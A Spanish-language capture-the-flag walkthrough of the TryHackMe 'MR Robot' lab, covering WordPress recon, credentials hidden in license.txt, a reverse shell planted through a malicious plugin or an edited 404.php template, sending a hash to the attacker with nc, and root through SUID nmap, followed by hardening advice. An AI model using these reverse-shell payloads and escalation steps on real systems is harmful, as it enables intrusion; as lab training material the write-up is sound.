# Contexto

La máquina ***MR Robot*** de TryHackMe es una máquina vulnerable basada en la mítica serie que lleva el mismo nombre. La máquina contiene muchos guiños y referencias a la serie que hacen que la experiencia de la máquina sea excepcional.

Esta máquina es algo diferente a las demás debido a que no solo buscamos dos ___flags___ (`user.txt` y `root.txt`). Sino que debemos de encontrar tres ___flags___ que pueden estar repartidas por toda la infraestructura del laboratorio, lo que nos obliga a ser más observadores.

>[!important]
>Recomiendo encarecidamente intentar solucionar por cuenta propia dicha máquina, usando esta guía como pequeñas pistas tras unos 15 o 20 minutos de quedar atascado en alguna parte del laboratorio.
>
>Fallar es la única forma de aprender de verdad. ***ÁNIMO!!!***

---
---
# <font color=red>[+]</font> Reconocimiento

```
sudo nmap -p- -Pn -n -vvv -sS $IP

PORT    STATE SERVICE
22/tcp  open  ssh     reset ttl 62
80/tcp  open  http    reset ttl 62
443/tcp open  https   reset ttl 62
```

```
sudo nmap -p 22,80,443 -Pn -n -sVC -oN versiones.nmap $IP

PORT    STATE SERVICE VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 61:c4:9f:3b:06:a1:c9:5b:da:51:d7:8f:04:a0:17:83 (RSA)
|   256 e5:55:32:54:94:b0:7a:32:05:51:c8:c7:4b:a9:18:cc (ECDSA)
|_  256 ec:90:f3:dc:b5:85:51:99:7e:e6:ed:cc:0a:2d:3f:9f (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http Apache httpd
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:     3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1:   ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
|_SHA-256: 37a8 b3f1 9d82 8a07 e93c a297 70aa 4146 8004 451e c6b9 c779 be0b 44b3 d276 3bd8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Apreciamos que la máquina corre servicios SSH, HTTP y HTTPS. Vamos a investigar los servicios web.
# ffuf

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://$IP/FUZZ -fc 404

index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1124ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 1501ms]
wp-login.php            [Status: 200, Size: 2613, Words: 115, Lines: 53, Duration: 1874ms]
index.html              [Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 34ms]
wp-register.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 538ms]
readme.html             [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 32ms]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 342ms]
.htaccess               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 31ms]
license.txt             [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 115ms]
robots.txt              [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 32ms]
sitemap.xml             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
```

## wpscan
Podemos ver que es una página web creada a partir del CMS ***WordPress***. Ya que sabemos esto, escaneemos de forma más exhaustiva el mismo usando `wpscan`.

```
wpscan --url http://$IP --enumerate vp,vt,u

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.130.147.37/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.130.147.37/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.130.147.37/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.130.147.37/5651906.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.130.147.37/5651906.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.130.147.37/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.130.147.37/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.1
 | Style URL: http://10.130.147.37/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.130.147.37/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:27 <============================================================================================> (652 / 652) 100.00% Time: 00:01:27
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Mar 16 11:53:33 2026
[+] Requests Done: 714
[+] Cached Requests: 10
[+] Data Sent: 185.518 KB
[+] Data Received: 501.152 KB
[+] Memory used: 271.488 MB
[+] Elapsed time: 00:01:50
```

No hemos encontrado ningún plugin ni ningún tema vulnerable y tampoco hemos sido capaces de enumerar ningún usuario. No obstante, hemos recopilado información valiosa como la existencia de un archivo _robots.txt_ (el cual también encontramos usando `ffuf`), verificamos que el archivo `xmlrpc.php` está activo y también encontramos la versión de WordPress utilizada `WordPress version 4.3.1`.

### robots.txt

Miraremos el fichero `robots.txt` a ver si nos muestra algún _endpoint_ de interés.
```HTTP
curl -i http://$IP/robots.txt

HTTP/1.1 200 OK
Date: Mon, 16 Mar 2026 11:04:20 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Last-Modified: Fri, 13 Nov 2015 07:28:21 GMT
ETag: "29-52467010ef8ad"
Accept-Ranges: bytes
Content-Length: 41
Content-Type: text/plain

User-agent: *
fsocity.dic
key-1-of-3.txt
```

***BINGO!*** Podemos ver que existen dos _endpoints_ que no se indexan y que tienen muy buena pinta.

>[!note]
>Para obtener la primera _flag_ tan solo debemos de realizar una petición `GET` al _endpoint_ `http://$IP/key-1-of-3.txt`
>
>Esto podemos realizarlo desde el navegador, navegando directamente hacia el _endpoint_, o usando herramientas como `curl`:
>```HTTP
>curl -i http://$IP/key-1-of-3.txt
>
>HTTP/1.1 200 OK
><snip>
>
>[hidden]
>```

También encontramos dentro de `robots.txt` un _endpoint_ `fsocity.dic`, al cual cuando accedemos nos muestra una __wordlist__ con palabras relacionadas con la serie.

>[!tip]
>Esta wordlist es muy extensa, podemos corroborarlo mirando el número de líneas que tiene:
>```bash
>curl http://$IP/fsocity.dic | wc -l
>
>858160
>```
>Aunque nos puede servir para realizar ataques de fuerza bruta, como no llevamos mucho en la fase de enumeración, guardaremos la __wordlist__ en un fichero para tenerlo a mano por si nos hiciera falta más adelante:
>```bash
>curl http://$IP/fsocity.dic > wordlist
>```

Si seguimos analizando los resultados de `ffuf` vemos que existe un fichero `readme.html` el cual nos muestra el siguiente mensaje:
>I like where you head is at. However I'm not going to help you.

Esto nos puede dar una pista de que vamos por buen camino a la hora de enumerar los _endpoints_, por lo que seguimos buscando.

Si seguimos analizando el resultado de `ffuf` vemos que también existe un fichero `license.txt`, que podría pasar desapercibido pero, como _hackers éticos_, no debemos de dejar pasar nada.
```bash
curl http://$IP/license.txt

<snip>
[hidden_base64_message]
```

>[!note]
>Si usamos `curl` se nos mostrará directamente el final de la respuesta HTTP por lo que no tendremos problema. Pero si accedemos a este fichero desde el navegador pasará lo contrario.
>
>Al acceder desde el navegador, la página se abrirá desde arriba hacia abajo mostrando un mensaje desmotivador dejando caer que ahí no hay nada de interés. Sin embargo, no debemos de hacerle caso y bajar hasta encontrar el código en __base 64__.

La respuesta nos muestra un código en __base 64__ el cual deberemos de decodificar, ya sea usando una aplicación web o la herramienta `base64` de la terminal en caso de tenerla instalada (En _Kali Linux_ viene instalada por defecto).
```bash
echo [hidden_base64_message] | base64 -d

[hidden_credentials]
```

Cuando decodificamos el código, vemos unas credenciales que seguramente podamos usar para acceder al panel de administración de WordPress.

Al tratar de acceder al panel de administración de WordPress con las credenciales obtenidas tenemos éxito, además accediendo como el usuario `administrador`. Por lo que me hace pensar que tal vez se haya reutilizado las mismas credenciales para el servicio SSH.

```bash
ssh [username]@$IP
```

>[!important]
>Aunque no tenemos suerte, la ***reutilización de contraseñas*** es una de las malas prácticas que más usan los usuarios en todo el mundo, por lo que siempre debemos de probar las credenciales en más de un servicio.

Al acceder al panel de administración de WordPress como el usuario administrador, conseguir una _reverse Shell_ no es algo complicado ya que tenemos permisos para hacer cualquier cosa.
Tenemos dos opciones principales:
>[!warning]
>La primera opción consiste en crear un plugin malicioso que ejecute un reverse shell en el servidor de la víctima hacia nuestra máquina atacante.
>
>Para ello:
>- Creamos el plugin malicioso.
>  ```PHP
>  vim shell.php
>  
>  <?php
>  /**
>    * Plugin Name: My CTF Shell
>    * Version: 1.0
>    * Author: PcxRoot
>    */
>    exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1'");
>    ?>
>  ```
>  - Comprimimos el plugin en un __ZIP__.
>    ```bash
>    zip plugin.zip shell.php
>    ```
>  - Ponemos el puerto especificado (`4444`) a la escucha.
>    ```bash
>    nc -lvnp 4444
>    ```
>  - Instalamos y activamos el plugin en WordPress.
>    1. Nos dirigimos al panel de administración de WordPress > _Plugins_ > _Add new_ > Instalamos el plugin malicioso
>    2. Activamos el plugin haciendo clic _Plugin Activate_

>[!warning]
>La segunda opción es modificar una de las plantillas que usa WordPress.
>
>Para ello:
>- Ponemos un puerto a la escucha:
>  ```bash
>  nc -lvnp 4444
>  ```
>- Accedemos a: _Appearance_ > _Editor_ > `404.php`
>- Modificamos la plantilla añadiendo una reverse shell para se ejecute cada vez que se active la misma.
>  ```php
>  exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1'");
>  ```
>Tras esto ya tendremos una reverse shell.

---
# <font color=red>[+]</font> Post-Explotación

## Estabilización de la TTY

Tras obtener acceso inicial mediante una _reverse shell_ con Netcat, la conexión resultante es una shell limitada (***non-interactive***) que carece de funciones esenciales como el autocompletado (`Tab`), el historial de comandos o el manejo de señales de teclado (como `SIGINT`). Para operar de forma segura y eficiente, especialmente para tareas que requieren editores de texto o comandos complejos, es imperativo realizar un tratamiento de la TTY siguiendo estos pasos:
```bash
# 1. Generamos una terminal interactiva
script -c bash /dev/null

# 2. Suspendemos y configuramos nuestra terminal local
# (Presionamos CTRL+Z)
stty raw -echo ; fg

# 3. Escribimos cualquier cosa para devolvernos a la shell
return

# 4. Configuramos el entorno
export TERM=xterm    # Nos permitirá acceder a funciones básicas como clear
export PS1="\u@\w>"  # El prompt que se nos muestra por defecto es demasiado largo, esto tan solo lo muestra con el nombre de usuario y el directio actual
```

>[!tip]
>Es posible que la estabilización anterior, aunque funcione, no tenga funcionalidades como el autocompletado usando el `Tab`.
>
>En ese caso deberemos de aprovechar que `Python` se encuentra instalada en la máquina, y utilizarlo para crear una shell interactiva con `bash`:
>```bash
># 1. Spawn de Bash
>python3 -c 'import pty; pty.spawn("/bin/bash")'
>
># 2. Preparación de la terminal local
>CTRL+Z (suspender) -> stty raw -echo ; fg
>
># 3. Configuración de variables
>export TERM=xterm
>export PS1="\u@\w>"
>```

## <font color=red>[+]</font> Escalada de privilegios

Si miramos los directorios personales en `/home` nos damos cuenta de que existen los directorios `robot` y `ubuntu`. Cuando listamos su contenido vemos que el directorio `robot` contiene la segunda *flag* dentro del fichero `key-2-of-3.txt`, pero no contamos con los permisos necesarios para leer el contenido.
```bash
ls -la /home/robot

<snip>
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```
Sin embargo, tenemos permisos de lectura sobre el fichero `password.raw.md5`. Cuando vemos su contenido encontramos lo que parece unas credenciales con la contraseña ***hasheada*** en ***md5***.

Lo primero que hacemos es ir a Internet y tratar de crackearlo usando alguna aplicación web, pero no he conseguido crackearlo de forma exitosa. Por lo que decido usar `hashcat` con la *wordlist* `rockyou.txt`.

>[!note]
>Para ello debemos de pasar el hash a nuestro sistema.
>Esto puede ser tan simple como copiar y pegar el contenido, pero aquí hemos venido a aprender y hacer la cosas como las haría *Elliot*, por lo que:
>- Preparamos un puerto que pondremos a la escucha en nuestra máquina atacante:
>```bash
>nc -nvlp 7777 > hash.txt
># Todo lo que resiva en la conexión lo guardará en el fichero hash.txt
>```
>- Limpiamos el hash:
>  El hash viene con el formato `usuario:hash`, pero a nosotros tan solo nos interesa en este momento el hash. Para solo pasar por la conexión el hash:
>  ```bash
>  awk -F: '{print $2}' password.raw-md5 | nc IP_KALI 7777
>  ```
>  Tras pasar un par de segundo ya podremos cerrar la conexión y verificar que dentro del fichero `hash.txt` de la máquina *kali Linux* se encuentra el ***hash md5***.

Una vez ya tenemos el hash limpio en nuestra máquina atacante podemos usar `hashcat` para crackearlo.
```bash
hashcat -m0 hash.txt /usr/share/wordlists/rockyou.txt

[hash-md5]:[contraseña]
```

Una vez que hemos obtenido la contraseña podemos tratar de conectarnos por SSH a el servidor usando el usuario y contraseña que hemos obtenido, o podemos usar `su` para cambiar de usuario dentro de la misma `pty` que hemos estado usando hasta ahora.

Yo aprovecharé que se encuentra abierto el servicio SSH para tener un `pty` más compacto.
```bash
ssh robot@$IP
```
No obstante, tras acceder por SSH, identifiqué que el usuario operaba bajo `/bin/sh` (usando `echo $0`), lo que limitaba la interactividad (por ejemplo, ausencia de *Tab-completion*). Por lo que procedí a realizar un upgrade manual de la shell ejecutando `/bin/bash` para mejorar la eficiencia en la enumeración post-explotación."
```bash
echo $0
-sh

/bin/bash
echo $0
bash
```

Siendo el usuario `robot` ya tenemos acceso a el fichero `/home/robot/key-2-f-3.txt`. Pero ahora debemos de escalar aún más privilegios parra llegar al usuario `root`.

>[!warning]
>Para ello usamos el comando `find` para listar los ficheros que contengan el ***bit SUID activado***:
>```bash
>find / -perm /4000 2>/dev/null
>
><snip>
>/usr/local/bin/nmap
><snip>
>```
>Esto es muy valioso.
>
>En versiones de **nmap** existe un modo denominado ***interactivo*** que permite al usuario comunicarse directamente con el binario para gestionar escaneos. Al acceder a este modo mediante la *flag* `--interactive`, es posible ejecutar comandos del sistema operativo utilizando un prefijo de exclamación (`!`).
>
>Al introducir el comando `!bash`, le estamos ordenando a **Nmap** que cree una instancia de la shell Bash; si el binario de Nmap cuenta con el ***bit SUID activo*** (como en este caso) o se ejecuta mediante ***SUDO***, esta nueva shell heredará los privilegios del propietario del binario (`root`), permitiendo un escape completo de las restricciones del usuario actual.
>
>Por lo que para escalar privilegios tan solo deberemos de seguir los siguientes pasos:
>```bash
>nmap --interactive
>!bash
>
>whoami
># root
>```
>Y tras esto ya podremos obtener la última *flag* en `/root/key-3-of-3.txt`.

>[!tip]
>Es importante destacar que la posibilidad de usar `find` para detectar binarios con el ***bit SUID activo*** estuvo desde el primer momento en el que conseguimos acceso a la máquina. El hecho de que no se haya usado este método es que el principal objetivo de estos *CTFs* es el de aprender, por lo que tomar atajos nos habría quitado parte de diversión y aprendizaje.
>
>No obstante, en un escenario de auditoría real, la eficiencia operativa es un factor determinante. Identificar vectores críticos de escalada de privilegios inmediatamente después del compromiso inicial no solo optimiza los tiempos de la intrusión, sino que permite evaluar de forma ágil el alcance total del riesgo sobre la infraestructura del cliente.

---
---
# <font color=green>[+]</font> Recomendaciones de Seguridad (Mitigación)

1. **Gestión de Archivos Sensibles:** Eliminar o restringir el acceso a archivos como `robots.txt` que revelen la estructura de diccionarios o *flags(. El archivo `license.txt` no debería contener credenciales en base64.
2. **Hardening de WordPress:**
   - Desactivar el editor de archivos en el panel de administración (`DISALLOW_FILE_EDIT`).
   - Implementar ***doble factor de autenticación (2FA)*** para el usuario administrador.
   - Deshabilitar el archivo `xmlrpc.php` si no es estrictamente necesario.
3. **Principio de Menor Privilegio:** Auditar los binarios con bit SUID. Binarios como `nmap` nunca deben tener este permiso activo para usuarios no privilegiados, ya que permiten la ejecución de comandos como root.
4. **Política de Contraseñas:** Evitar la reutilización de credenciales entre servicios (WordPress y SSH) y asegurar que no existan hashes almacenados en texto claro o formatos débiles (MD5) en directorios de usuario.
